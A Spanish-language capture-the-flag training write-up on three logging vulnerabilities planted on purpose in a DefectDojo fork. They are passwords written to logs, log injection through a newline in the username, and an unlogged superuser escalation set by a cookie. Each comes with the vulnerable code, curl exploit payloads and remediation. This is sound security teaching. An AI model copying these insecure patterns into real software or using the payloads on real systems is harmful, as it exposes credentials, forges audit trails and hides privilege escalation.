# OWASP A09:2025 — Security Logging & Alerting Failures
## Vulnerabilidades de práctica implementadas en DefectDojo

> **Propósito:** Material de entrenamiento para ejercicio de *capture-the-flag* / análisis de código. Las vulnerabilidades fueron introducidas **intencionalmente** en el fork de DefectDojo.
> **No ejecutar en producción ni contra sistemas sin autorización.**

---

## Índice

1. [Vuln 1 — Contraseña en texto plano en logs (CWE-532)](#vuln-1--contrase%C3%B1a-en-texto-plano-en-logs-cwe-532)
2. [Vuln 2 — Log Injection (CWE-117)](#vuln-2--log-injection-cwe-117)
3. [Vuln 3 — Escalada de privilegios sin logging (CWE-778)](#vuln-3--escalada-de-privilegios-sin-logging-cwe-778)

---

## Vuln 1 — Contraseña en texto plano en logs (CWE-532)

### Descripción

CWE-532 ocurre cuando información sensible (contraseñas, tokens, PII) se escribe en archivos de log. Cualquier persona con acceso a los logs —administradores, pipelines de CI/CD, sistemas SIEM, servicios de log aggregation— puede leer esa información en texto plano.

En este caso, el handler `log_user_login_failed` registra la contraseña intentada cada vez que falla un login, exponiendo credenciales en los logs del contenedor.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/user/views.py` |
| **Clase / Método** | `DojoLoginView.form_invalid` |

### Código vulnerable

```python
class DojoLoginView(LoginView):
    ...
    def form_invalid(self, form):
        logger.warning(
            f"login failed for: {self.request.POST.get('username', '')} "
            f"(password: {self.request.POST.get('password', '')}) "
            f"via ip: {self.request.META.get('REMOTE_ADDR')}"
        )
        return super().form_invalid(form)
```

### Cómo explotar

**Requisito:** ninguno — cualquier intento de login (incluso sin cuenta) genera el log.

El helper `deployment/helpers/A09/A09_V1.py` automatiza el flujo:

```bash
python deployment/helpers/A09/A09_V1.py --host http://<HOST> --user admin --password MiContrasena123
```

**Manual con `curl`:**

```bash
# Intentar login con credenciales incorrectas
curl -s -X POST http://<HOST>/login \
  -c /tmp/c.txt \
  -b /tmp/c.txt \
  -d "username=admin&password=MiContrasena123&csrfmiddlewaretoken=$(
      curl -sc /tmp/c.txt http://<HOST>/login | grep -oP 'csrfmiddlewaretoken.*?value=\"\K[^\"]+' | head -1
  )"

# Verificar en el log del contenedor
docker compose logs uwsgi 2>&1 | grep "login failed for: admin"
# Salida esperada:
# WARNING login failed for: admin (password: MiContrasena123) via ip: ...
```

### Escenario de ataque real

Un atacante con acceso al sistema de logging (Elasticsearch, CloudWatch, Splunk) puede:

1. Buscar `login failed for:` en todos los logs
2. Extraer las contraseñas intentadas — muchos usuarios reutilizan contraseñas
3. Probar esas contraseñas en otros sistemas (credential stuffing)
4. Si el usuario cometió un typo (ej. escribió su contraseña en el campo usuario), la contraseña real queda expuesta directamente

### Impacto

- Exposición de contraseñas de usuarios en texto plano en cualquier sistema que consuma los logs.
- Las contraseñas reutilizadas permiten comprometer otros servicios (correo, VPN, GitHub).
- Violación de normativas GDPR, PCI-DSS, HIPAA por almacenamiento de datos sensibles en logs.

### Remediación

- **Nunca loguear contraseñas, tokens ni datos sensibles.**
- Loguear solo el username y la IP:
  ```python
  logger.warning("login failed for: %s via ip: %s",
                 credentials["username"], request.META["REMOTE_ADDR"])
  ```
- Usar `%s` (lazy formatting) en lugar de f-strings para evitar la evaluación del mensaje si el nivel de log está desactivado.
- Implementar scrubbing de secrets en el pipeline de log aggregation como defensa en profundidad.

---

## Vuln 2 — Log Injection (CWE-117)

### Descripción

CWE-117 ocurre cuando datos controlados por el usuario se escriben en un log sin neutralizar caracteres de control (especialmente `\n` y `\r`). Un atacante puede inyectar líneas de log falsas que aparecen como eventos legítimos, comprometiendo la integridad del audit trail.

En este caso, tanto `log_user_login` como `log_user_login_failed` usan f-strings con el username directamente, sin sanitizar saltos de línea.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/utils.py` |
| **Funciones** | `log_user_login`, `log_user_login_failed` |

### Código vulnerable

```python
@receiver(user_logged_in)
def log_user_login(sender, request, user, **kwargs):
    # CWE-117: username no sanitizado (sin strip de saltos de línea)  ← VULN A09-2
    logger.info(f"login user: {user.username} via ip: {request.META.get('REMOTE_ADDR')}")

@receiver(user_login_failed)
def log_user_login_failed(sender, credentials, request, **kwargs):
    if "username" in credentials:
        # CWE-117: username sin sanitizar  ← VULN A09-2
        logger.warning(
            f"login failed for: {credentials['username']} ..."
        )
```

### Cómo explotar

**Requisito:** ninguno — el formulario de login acepta cualquier username.

El helper `deployment/helpers/A09/A09_V2.py` construye y envía el payload:

```bash
python deployment/helpers/A09/A09_V2.py --host http://<HOST>
```

**Manual — construcción del payload:**

```bash
# El username contiene un salto de línea seguido de una línea de log falsa
INJECTED="victim_user
INFO login user: admin via ip: 10.0.0.1"

# URL-encode el salto de línea (%0A)
curl -s -X POST http://<HOST>/login \
  -c /tmp/c.txt -b /tmp/c.txt \
  -d "username=victim_user%0AINFO+login+user%3A+admin+via+ip%3A+10.0.0.1&password=x&csrfmiddlewaretoken=<TOKEN>"

# Ver el resultado en los logs
docker compose logs uwsgi 2>&1 | grep -A2 "victim_user"
# Salida esperada:
# WARNING login failed for: victim_user
# INFO login user: admin via ip: 10.0.0.1    ← línea FALSA inyectada
```

### Escenario de ataque real

Un atacante puede:

1. Crear una cuenta cuyo username contenga `\nINFO login user: admin via ip: 1.2.3.4`
2. Tras cualquier intento de login de esa cuenta, aparece en los logs una entrada falsa que indica que `admin` se autenticó exitosamente desde `1.2.3.4`
3. Los analistas del SOC investigarán a `admin` en lugar de al verdadero atacante
4. En sistemas de log analysis automatizados, puede disparar alertas falsas (DoS del SIEM) o encubrir actividad maliciosa real

### Impacto

- Contaminación del audit trail: los logs dejan de ser confiables como evidencia forense.
- Falsos positivos/negativos en el SIEM: actividad maliciosa real puede ocultarse.
- En auditorías de compliance (SOC 2, ISO 27001), logs manipulados invalidan controles.

### Remediación

- Sanitizar el username antes de loguearlo: eliminar o escapar `\n`, `\r` y otros caracteres de control:
  ```python
  def _sanitize_for_log(value: str) -> str:
      return value.replace("\n", "\\n").replace("\r", "\\r")

  logger.warning("login failed for: %s via ip: %s",
                 _sanitize_for_log(credentials["username"]),
                 request.META["REMOTE_ADDR"])
  ```
- Usar logging estructurado (JSON) en lugar de texto plano — los campos se escriben separados y los saltos de línea no crean nuevas entradas.
- Validar el formato del username en el registro de cuentas (rechazar caracteres de control).

---

## Vuln 3 — Escalada de privilegios sin logging (CWE-778)

### Descripción

CWE-778 ocurre cuando eventos de seguridad relevantes no son registrados. La ausencia de logs hace que los ataques sean indetectables durante y después de la intrusión, imposibilitando la respuesta a incidentes y el análisis forense.

En este caso, el middleware `UserRoleCookieMiddleware` eleva `is_superuser` a `True` cuando recibe `dd_role=superuser` sin registrar ningún evento. El atacante puede escalar privilegios, acceder a datos sensibles y abandonar el sistema sin dejar ningún rastro en los logs.

Esta vulnerabilidad **combina con A08-Vuln 2** (cookie sin integridad): el ataque en sí es posible por A08, pero la invisibilidad del ataque es responsabilidad de A09.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/middleware.py` |
| **Clase** | `UserRoleCookieMiddleware` |

### Código vulnerable

```python
def __call__(self, request):
    if request.user.is_authenticated:
        dd_role = request.COOKIES.get("dd_role", "")
        if dd_role == "superuser":
            request.user.is_superuser = True
            # CWE-778: escalada de privilegios no registrada  ← VULN A09-3
        elif dd_role == "staff":
            request.user.is_staff = True
    return self.get_response(request)
```

### Cómo explotar (demostración de invisibilidad)

**Requisito:** cuenta válida con cualquier rol y la sesión activa.

Usar el helper de A08 para escalar privilegios, luego verificar la ausencia de logs en el servidor:

```bash
python deployment/helpers/A08/A08_V2.py --host http://<HOST> --user maintainer1 --password <PASS>
```

**Verificación en el servidor:**

```bash
SID=<sessionid>
HOST=http://<HOST>

# 1. Escalar privilegios (ataque A08-V2)
curl -s -b "sessionid=$SID; dd_role=superuser" \
  "$HOST/api/v2/users/?format=json" -o /dev/null -w "HTTP %{http_code}\n"
# Salida: HTTP 200  (escalada exitosa)

# 2. Buscar rastro en logs → resultado: vacío
docker compose logs uwsgi 2>&1 | grep -i "dd_role\|superuser\|privilege"
# Salida esperada: (ninguna línea)

# 3. Comparar con un login normal que SÍ deja rastro
docker compose logs uwsgi 2>&1 | grep "login user:"
# Salida: INFO login user: maintainer1 via ip: ...
```

### Escenario de ataque real — línea de tiempo

```
T+0:00  Atacante inicia sesión como maintainer1  → LOG: "login user: maintainer1"
T+0:01  Atacante añade dd_role=superuser         → LOG: (nada)
T+0:02  Atacante lista todos los usuarios        → LOG: (nada)
T+0:03  Atacante descarga tokens de integración → LOG: (nada)
T+0:10  Atacante cierra sesión                   → LOG: "logout user: maintainer1"

Resultado: los logs muestran un login y logout normales de maintainer1.
El incidente es completamente invisible sin monitorización adicional.
```

### Impacto

- Imposibilidad de detección en tiempo real: ningún SIEM puede alertar sobre un evento no registrado.
- Análisis forense post-incidente incompleto: no se puede reconstruir qué hizo el atacante.
- Incumplimiento de estándares de auditoría que requieren registro de cambios de privilegio (PCI-DSS 10.2, ISO 27001 A.12.4).

### Remediación

- Registrar **todo intento** de elevación de privilegio, tanto exitoso como fallido:
  ```python
  import logging
  logger = logging.getLogger(__name__)

  if dd_role == "superuser":
      logger.warning(
          "privilege escalation via dd_role cookie: user=%s ip=%s → is_superuser=True",
          request.user.username,
          request.META.get("REMOTE_ADDR"),
      )
      request.user.is_superuser = True
  ```
- Emitir también un evento en el sistema de auditoría (`django-auditlog`) para tener persistencia.
- Añadir alertas en el SIEM sobre `privilege escalation` con umbral bajo (1 ocurrencia = alerta).

---

## Tabla resumen

| # | Nombre | CWE | Archivo afectado | Demostración |
|---|--------|-----|-----------------|-------------|
| 1 | Contraseña en logs | CWE-532 | `dojo/user/views.py` | `docker compose logs uwsgi \| grep "password:"` |
| 2 | Log Injection | CWE-117 | `dojo/utils.py` | Login con username `\n` → línea falsa en logs |
| 3 | Escalada sin logging | CWE-778 | `dojo/middleware.py` | Usar A08_V2 + `docker compose logs uwsgi \| grep -i superuser` → vacío |

---

## Referencias

- [OWASP Top 10 A09:2025](https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/)
- [OWASP Cheat Sheet: Logging](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [OWASP Application Logging Vocabulary](https://cheatsheetseries.owasp.org/cheatsheets/Application_Logging_Vocabulary_Cheat_Sheet.html)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [CWE-532: Insertion of Sensitive Information into Log File](https://cwe.mitre.org/data/definitions/532.html)
- [CWE-778: Insufficient Logging](https://cwe.mitre.org/data/definitions/778.html)
